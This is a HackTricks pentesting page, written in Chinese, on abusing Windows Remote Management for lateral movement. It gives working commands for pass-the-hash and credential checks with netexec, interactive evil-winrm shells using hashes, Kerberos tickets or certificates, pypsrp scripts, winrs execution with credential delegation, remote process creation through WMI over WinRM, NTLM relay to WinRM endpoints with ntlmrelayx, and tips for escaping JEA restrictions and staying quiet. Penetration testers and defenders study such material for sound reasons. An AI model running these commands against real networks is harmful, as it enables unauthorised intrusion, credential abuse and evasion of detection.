# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM 是 Windows 环境中最方便的**横向移动**传输方式之一，因为它可以通过 **WS-Man/HTTP(S)** 提供远程 shell，而无需使用创建 SMB 服务的技巧。如果目标开放了 **5985/5986**，并且你的主体被允许使用远程处理，通常可以非常快速地从“valid creds”转为“interactive shell”。

有关**协议/服务枚举**、listeners、启用 WinRM、`Invoke-Command` 以及通用客户端用法，请查看：

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## 操作者喜欢 WinRM 的原因

- 使用 **HTTP/HTTPS** 而不是 SMB/RPC，因此在 PsExec 风格的执行被阻止时通常仍然可用。
- 配合 **Kerberos** 时，可以避免向目标发送可复用的凭据。
- 可从 **Windows**、**Linux** 以及 Python 工具（`winrs`、`evil-winrm`、`pypsrp`、`netexec`）中正常使用。
- 交互式 PowerShell 远程处理路径会在目标上、已认证用户的上下文中生成 **`wsmprovhost.exe`**，这在操作层面不同于基于服务的执行。

## 访问模型和前提条件

实际上，成功的 WinRM 横向移动取决于**三个**条件：

1. 目标具有 **WinRM listener**（`5985`/`5986`），并且防火墙规则允许访问。
2. 账户可以向 endpoint **进行身份验证**。
3. 账户被允许**打开远程处理会话**。

获得此访问权限的常见方式：

- 在目标上拥有 **Local Administrator** 权限。
- 在较新的系统中属于 **Remote Management Users**，或者在仍然认可该组的系统/组件中属于 **WinRMRemoteWMIUsers__**。
- 通过本地安全描述符 / PowerShell 远程处理 ACL 更改显式委派远程处理权限。

如果你已经控制了一台具有管理员权限的主机，请记住，也可以使用此处描述的技术，在**无需加入完整管理员组**的情况下委派 WinRM 访问权限：

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### 横向移动期间需要注意的身份验证问题

- **Kerberos 需要主机名/FQDN**。如果通过 IP 连接，客户端通常会回退到 **NTLM/Negotiate**。
- 在**工作组**或跨信任边界的特殊情况下，NTLM 通常需要使用 **HTTPS**，或者需要在客户端将目标添加到 **TrustedHosts**。
- 在工作组中使用 Negotiate 配合**本地账户**时，UAC 远程限制可能会阻止访问，除非使用内置 Administrator 账户，或设置 `LocalAccountTokenFilterPolicy=1`。
- PowerShell 远程处理默认使用 **`HTTP/<host>` SPN**。在 **`HTTP/<host>` 已注册到其他服务账户**的环境中，WinRM Kerberos 可能会失败并返回 `0x80090322`；可以使用包含端口的 SPN，或者在存在该 SPN 的情况下切换为 **`WSMAN/<host>`**。<sup>[[3]](#references)</sup>

如果你在 password spraying 期间获得了有效凭据，通过 WinRM 验证这些凭据通常是检查它们能否转换为 shell 的最快方式：

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux 到 Windows 的横向移动

### 使用 NetExec / CrackMapExec 进行验证和一次性执行
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM 交互式 shell

`evil-winrm` 仍然是 Linux 上最方便的交互式选项，因为它支持**密码**、**NT 哈希**、**Kerberos tickets**、**client certificates**、文件传输，以及内存中的 PowerShell/.NET 加载。
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN 边缘情况：`HTTP` vs `WSMAN`

当默认的 **`HTTP/<host>`** SPN 导致 Kerberos 失败时，可以尝试请求/使用 **`WSMAN/<host>`** ticket。在经过加固或配置异常的 enterprise 环境中，`HTTP/<host>` 可能已关联到其他 service account。<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
这在 **RBCD / S4U** abuse 之后也很有用，尤其是当你专门伪造或请求了 **WSMAN** service ticket，而不是通用的 `HTTP` ticket 时。

### 基于证书的身份验证

WinRM 还支持**客户端证书身份验证**，但该证书必须在目标上映射到一个**本地账户**。从 offensive 角度来看，以下情况值得注意：

- 你已经窃取或导出了一个有效的客户端证书和私钥，并且该证书已为 WinRM 配置映射；
- 你 abuse 了 **AD CS / Pass-the-Certificate**，为某个 principal 获取证书，然后 pivot 到另一条身份验证路径；
- 你正在避免使用基于密码的远程管理的环境中操作。
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM 比 password/hash/Kerberos auth 少见得多，但一旦存在，它可以提供一种能够在 password rotation 后仍然有效的 **无密码 lateral movement** 路径。

### 使用 `pypsrp` 进行 Python / automation

如果你需要 automation 而不是 operator shell，`pypsrp` 可以通过 Python 提供 WinRM/PSRP，并支持 **NTLM**、**certificate auth**、**Kerberos** 和 **CredSSP**。<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
如果你需要比高级 `Client` wrapper 更精细的控制，较底层的 `WSMan` + `RunspacePool` API 对于两个常见的 operator 问题很有用：

- 强制使用 **`WSMAN`** 作为 Kerberos service/SPN，而不是许多 PowerShell clients 默认使用的 **`HTTP`**；
- 连接到**非默认的 PSRP endpoint**，例如 **JEA** / custom session configuration，而不是 `Microsoft.PowerShell`。
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Custom PSRP endpoints and JEA 在 lateral movement 期间很重要

成功的 WinRM authentication **并不总意味着你会进入默认且不受限制的 `Microsoft.PowerShell` endpoint。成熟的环境可能会公开具有独立 ACL 和 run-as 行为的** custom session configurations **或** JEA **endpoints。<sup>[[1]](#references)</sup>

如果你已经在 Windows 主机上获得 code execution，并希望了解存在哪些 remoting surfaces，可以枚举已注册的 endpoints：
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
当存在有用的 endpoint 时，应明确针对该 endpoint，而不是默认 shell：
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
实际攻击影响：

- 一个 **restricted** endpoint 只要暴露了恰当的 cmdlets/functions，用于服务控制、文件访问、进程创建或任意 .NET / 外部命令执行，仍然可能足以实现 lateral movement。
- 配置错误的 JEA role 尤其有价值，特别是在其暴露了 `Start-Process`、宽泛的通配符、可写 providers，或允许你逃脱预期限制的自定义 proxy functions 时。
- 由 **RunAs virtual accounts** 或 **gMSAs** 支持的 endpoints 会改变你所运行命令的实际安全上下文。尤其是，由 gMSA 支持的 endpoint 可以在 **second hop** 上提供 **network identity**，即使普通的 WinRM session 会遇到经典的 delegation 问题。

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` 是内置工具；如果你希望在不打开交互式 PowerShell remoting session 的情况下进行 **native WinRM command execution**，它会非常有用：
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
有两个容易忘记、但在实践中很重要的 flags：

- `/noprofile`：当远程 principal **不是**本地 administrator 时，通常是必需的。
- `/allowdelegate`：允许远程 shell 使用你的 credentials 访问**第三台主机**（例如命令需要访问 `\\fileserver\share` 时）。
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
在实际操作中，`winrs.exe` 通常会产生类似于以下内容的远程进程链：
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
这点值得记住，因为它不同于基于 service 的 exec，也不同于交互式 PSRP sessions。

### `winrm.cmd` / WS-Man COM，而不是 PowerShell remoting

你也可以通过 **WinRM transport** 执行操作，而无需使用 `Enter-PSSession`，方法是通过 WS-Man 调用 WMI classes。这样 transport 仍然是 WinRM，而远程执行 primitive 则变为 **WMI `Win32_Process.Create`**：
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
该方法适用于以下情况：

- PowerShell logging 受到严格监控。
- 你希望使用 **WinRM transport**，但不想采用经典的 PS remoting workflow。
- 你正在构建或使用围绕 **`WSMan.Automation`** COM 对象的自定义 tooling。

## NTLM relay 到 WinRM (WS-Man)

当 SMB relay 因 signing 被阻止，而 LDAP relay 受到限制时，**WS-Man/WinRM** 仍可能是一个有吸引力的 relay target。现代版 `ntlmrelayx.py` 包含 **WinRM relay servers**，可以 relay 到 **`wsman://`** 或 **`winrms://`** targets。
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
两个实用注意事项：

- 当目标接受 **NTLM**，且被 relay 的主体被允许使用 WinRM 时，Relay 最有用。
- 最新的 Impacket 代码会专门处理 **`WSMANIDENTIFY: unauthenticated`** 请求，因此类似 `Test-WSMan` 的探测不会中断 relay 流程。

登录第一个 WinRM 会话后，如需了解多跳限制，请参阅：

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC 和检测注意事项

- **Interactive PowerShell remoting** 通常会在目标上创建 **`wsmprovhost.exe`**。
- **`winrs.exe`** 通常会创建 **`winrshost.exe`**，随后创建请求的子进程。
- 自定义 **JEA** 端点可能会以 **`WinRM_VA_*`** 虚拟帐户或配置的 **gMSA** 身份执行操作。与普通用户上下文的 shell 相比，这会改变遥测信息以及第二跳行为。<sup>[[1]](#references)</sup>
- 预计会出现 **network logon** 遥测、WinRM 服务事件，以及在使用 PSRP 而非原始 `cmd.exe` 时产生的 PowerShell operational/script-block logging。
- 如果只需要执行单条命令，`winrs.exe` 或一次性 WinRM 执行可能比长时间运行的交互式远程会话更加安静。
- 如果 Kerberos 可用，优先使用 **FQDN + Kerberos**，而不是 IP + NTLM，以减少信任问题以及在客户端进行不必要的 `TrustedHosts` 修改。

## 参考资料

- [1] [Microsoft：JEA 安全注意事项](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft：通过 WinRM 将 PowerShell 连接到远程服务器时出现错误 `0x80090322`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
